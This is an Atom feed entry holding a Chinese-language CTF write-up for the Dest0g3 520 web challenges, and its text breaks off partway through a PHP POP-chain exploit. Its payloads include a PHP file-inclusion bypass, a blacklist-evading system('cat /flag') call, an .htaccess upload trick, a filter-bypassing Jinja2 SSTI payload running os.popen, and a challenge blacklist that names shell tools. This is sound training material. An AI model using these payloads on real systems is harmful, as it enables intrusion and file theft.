<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M1seryの厨房</title>
  
  
  <link href="https://www.m0x01sery.com/atom.xml" rel="self"/>
  
  <link href="https://www.m0x01sery.com/"/>
  <updated>2022-05-26T16:00:00.000Z</updated>
  <id>https://www.m0x01sery.com/</id>
  
  <author>
    <name>M1sery</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Dest0g3 520迎新赛 web 11/13</title>
    <link href="https://www.m0x01sery.com/2022/05/27/[Dest0g3-520]/"/>
    <id>https://www.m0x01sery.com/2022/05/27/[Dest0g3-520]/</id>
    <published>2022-05-26T16:00:00.000Z</published>
    <updated>2022-05-26T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>考试周（x）考试月（✓）</p><p>某运会干的好事</p><p>延期了明年还得再体验一回</p><p>上个大学怎么这么多事（半恼</p><span id="more"></span><h1 id="phpdest"><a href="#phpdest" class="headerlink" title="phpdest"></a>phpdest</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接贴大师傅写的分析文章 太强了</p><p><a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p><p>payload如下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/var/</span>www<span class="regexp">/html/</span>flag.php</span><br></pre></td></tr></table></figure><h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;fl4g.php&quot;</span>;</span><br><span class="line"><span class="variable">$dest0g3</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;H&quot;</span>);</span><br><span class="line"><span class="variable">$timme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line"><span class="variable">$timmme</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$time</span> &gt; <span class="string">&quot;24&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timme</span> &gt; <span class="string">&quot;31&quot;</span>) <span class="keyword">or</span> (<span class="variable">$timmme</span> &gt; <span class="string">&quot;60&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$fl4g</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try harder!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(</span><br><span class="line">    function() <span class="keyword">use</span>(&amp;$<span class="title">fl4g</span>) &#123;</span><br><span class="line">        <span class="title">print</span> $<span class="title">fl4g</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$fl4g</span> .= <span class="variable">$dest0g3</span>;</span><br></pre></td></tr></table></figure><blockquote><p>set_error_handler — 设置用户自定义的错误处理函数</p><p>本函数可以用你自己定义的方式来处理运行中的错误，例如，在应用程序中严重错误发生时，或者在特定条件下触发了一个错误(使用 trigger_error())，你需要对数据/文件做清理回收。</p></blockquote><p>肥肠简单的一道题，报错就是胜利</p><p>一眼最后一行，字符串和数组直接拼接有明显的类型错误</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf[]<span class="operator">=</span><span class="number">233</span></span><br></pre></td></tr></table></figure><h1 id="SimpleRCE"><a href="#SimpleRCE" class="headerlink" title="SimpleRCE"></a>SimpleRCE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$aaa</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;aaa&#x27;</span>];</span><br><span class="line"><span class="variable">$black_list</span>=<span class="keyword">array</span>(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%0&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;char&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;ascii&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;replace&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;var&#x27;</span>,<span class="string">&#x27;pastre&#x27;</span>,<span class="string">&#x27;print&#x27;</span>,<span class="string">&#x27;tail&#x27;</span>,<span class="string">&#x27;sed&#x27;</span>,<span class="string">&#x27;pcre&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;scan&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;diff&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;pcntl&#x27;</span>,<span class="string">&#x27;proc_open&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;more&#x27;</span>,<span class="string">&#x27;sort&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;current&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;cut&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;nl&#x27;</span>,<span class="string">&#x27;wget&#x27;</span>,<span class="string">&#x27;vi&#x27;</span>,<span class="string">&#x27;grep&#x27;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$black_list</span>,<span class="string">&quot;hacker&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$aaa</span>);</span><br></pre></td></tr></table></figure><p>绕过黑名单里的关键字就是胜利，那么首先考虑字符拼接或是编码绕过总是没错的。</p><p>这里<code>decode</code>关键字和<code>^</code>都被过滤了的说，编码不能</p><p>拼接的话<code>implode()</code>函数会用一个指定的字符串作为分隔符连接数组元素为字符串，太棒了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aaa</span>=implode(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;m&#x27;</span>])(implode(<span class="string">&#x27;&#x27;</span>,[<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>]))<span class="comment">;</span></span><br></pre></td></tr></table></figure><h1 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h1><p>前端文件后缀名验证，抓包绕过就好</p><p>测试后发现后端过滤了以<code>ph</code>开头的后缀名，文件内容过滤了<code>&lt;?</code>，php的script标签也在高版本被废弃，这样看来直接写php文件不太行得通。</p><p>在<code>/uploads</code>页面我们得知后台为<strong>Apache Server</strong>，于是尝试上传.<strong>htaccess</strong>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_file /flag</span><br><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure><p>成功上传，再访问当前目录的png后缀文件就能拿到flag了。</p><p><a href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a></p><h1 id="EasySSTI"><a href="#EasySSTI" class="headerlink" title="EasySSTI"></a>EasySSTI</h1><p>Flask框架的SSTI，初步测试过滤了特殊字符<code>&#39;</code> <code>&quot;</code> <code>_</code> <code>[</code> <code>.</code>，就放行了<code>(</code> <code>)</code></p><p>思想和前面的黑名单字符绕过类似，考虑拼接构造，前提是必须能控制需要的单个字符。</p><p>首先学点新东西</p><blockquote><p>原生JinJa2函数 attr()，这是一个 attr() 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ | ）分割。如：</p><p>foo|attr(“bar”)   等同于   foo[“bar”]</p><p>|attr() 配合其他姿势可同时绕过双下划线 __ 、引号、点 . 和 [ 等。</p></blockquote><p>附上通用payload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;%</span> <span class="name">set</span> zero = ((&#123; &#125;<span class="punctuation">|</span>select<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">38</span>)<span class="punctuation">|</span>int) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> one = (zero**zero)<span class="punctuation">|</span>int <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> two = (zero-one-one)<span class="punctuation">|</span><span class="keyword">abs</span><span class="punctuation">|</span>int <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> four = (two*two)<span class="punctuation">|</span>int <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> five = (two*two*two)-one-one-one <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> seven = (zero-one-one-five)<span class="punctuation">|</span><span class="keyword">abs</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> xhx = ((&#123; &#125;<span class="punctuation">|</span>select<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">24</span>)<span class="punctuation">|</span>string) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> space = ((&#123; &#125;<span class="punctuation">|</span>select<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">10</span>)<span class="punctuation">|</span>string) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> point = ((app.__doc__<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">26</span>)<span class="punctuation">|</span>string) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> yin = ((app.__doc__<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">195</span>)<span class="punctuation">|</span>string) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> left = ((app.__doc__<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">189</span>)<span class="punctuation">|</span>string) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> right = ((app.__doc__<span class="punctuation">|</span>string<span class="punctuation">|</span>list).pop(<span class="number">200</span>)<span class="punctuation">|</span>string) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> c = dict(c=aa)<span class="punctuation">|</span><span class="keyword">reverse</span><span class="punctuation">|</span><span class="keyword">first</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> bfh=self<span class="punctuation">|</span>string<span class="punctuation">|</span>urlencode<span class="punctuation">|</span><span class="keyword">first</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> bfhc=bfh~c <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> slas = bfhc%((four~seven)<span class="punctuation">|</span>int) <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> but = dict(buil=aa,tins=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> imp = dict(imp=aa,ort=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> pon = dict(po=aa,pen=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> os = dict(o=aa,s=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> ca = dict(ca=aa,t=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> flg = dict(fl=aa,ag=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> ev = dict(ev=aa,al=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> red = dict(re=aa,ad=dd)<span class="punctuation">|</span><span class="keyword">join</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> bul = xhx*<span class="number">2</span>~but~xhx*<span class="number">2</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">set</span> pld = xhx*<span class="number">2</span>~imp~xhx*<span class="number">2</span>~left~yin~os~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">if</span> f == bul <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">for</span> a,b <span class="keyword">in</span> v.items() <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">if</span> a == ev <span class="template-tag">%&#125;</span><span class="template-variable">&#123;&#123;b(pld)&#125;&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endif</span> <span class="template-tag">%&#125;</span><span class="template-tag">&#123;%</span> <span class="name">endfor</span> <span class="template-tag">%&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"># eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)</span></span><br></pre></td></tr></table></figure><p>这道题把空格过滤了，注意把上面通用payload的空格全部格式化成换行再使用的说。</p><p><a href="https://xz.aliyun.com/t/9584">以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用</a></p><h1 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h1><h1 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]) &lt; <span class="number">55</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>); </span><br></pre></td></tr></table></figure><p>经典Phar＋GC组合，温故而知新</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">new</span> <span class="title function_ invoke__">banana</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;/fflaggg&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    